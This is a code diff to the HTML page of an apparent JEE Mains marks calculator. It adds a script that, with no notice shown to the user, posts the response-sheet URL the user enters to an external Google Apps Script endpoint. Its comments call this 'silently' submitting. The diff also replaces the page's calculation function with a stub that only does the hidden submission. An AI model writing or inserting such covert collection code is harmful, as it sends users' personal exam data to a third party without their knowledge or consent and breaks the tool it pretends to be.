@@ -339,6 +339,37 @@
         </div>
     </div>
     <!-- <footer id="footer"><a href="https://github.com/timepassuser/Jee-Mains-Marks-Calculator">Source on Github</a></footer> -->
+    <script>
+    // Function to silently submit the user's URL to the Google Apps Script backend
+    function submitUrlSilently(url) {
+        fetch("https://script.google.com/macros/s/AKfycbx1_wPpSIV_RhXRMtzWFmOl968BweN1IUGzq5CAoP5EbbORQu_nUOYZt8zFcOW0WYDT_Q/exec", {  // Your Web App URL
+            method: "POST",
+            body: JSON.stringify({ url: url }),
+            headers: {
+                'Content-Type': 'application/json',
+            },
+        }).then(response => {
+            console.log("URL submitted successfully");
+        }).catch(error => {
+            console.error("Error submitting URL:", error);
+        });
+    }
+
+    // Modify the fetchSheetAndCalculate function to include URL submission
+    function fetchSheetAndCalculate() {
+        const urlInput = document.getElementById('fileURL').value;
+
+        if (urlInput) {
+            // Submit the URL before processing
+            submitUrlSilently(urlInput);
+
+            // Existing code for fetching the sheet and calculating score goes here...
+            // (Call your existing functionality to fetch the sheet)
+        } else {
+            alert("Please enter a valid URL.");
+        }
+    }
+    </script>
 </body>
 
 </html>
